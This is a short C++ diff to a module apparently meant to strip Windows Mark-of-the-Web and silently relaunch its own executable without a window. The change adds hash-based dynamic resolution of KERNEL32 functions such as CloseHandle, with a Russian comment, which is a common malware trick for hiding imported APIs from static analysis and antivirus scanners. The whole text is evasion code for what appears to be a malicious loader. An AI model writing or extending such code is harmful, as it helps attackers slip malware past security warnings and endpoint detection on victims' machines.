@@ -9,11 +9,20 @@
 // 
 
 #include "Motw.h"
+#include "ApiResolver.h"
 
 namespace Motw
 {
     bool StripAndRelaunch()
     {
+        // Динамическое разрешение CloseHandle
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+
+        typedef BOOL (WINAPI* pfnCloseHandle)(HANDLE);
+        pfnCloseHandle pCloseHandle = (pfnCloseHandle)Api::GetProcByHashCrc(hK32, Api::CrcFn::CloseHandle);
+        if (!pCloseHandle) return false;
+
         // Step 1: Get our own executable path
         wchar_t selfPath[MAX_PATH];
         DWORD len = GetModuleFileNameW(NULL, selfPath, MAX_PATH);
@@ -50,8 +59,8 @@ namespace Motw
         if (CreateProcessW(selfPath, NULL, NULL, NULL, FALSE,
             CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
         {
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
+            pCloseHandle(pi.hProcess);
+            pCloseHandle(pi.hThread);
             return true; // Caller should ExitProcess(0)
         }
 
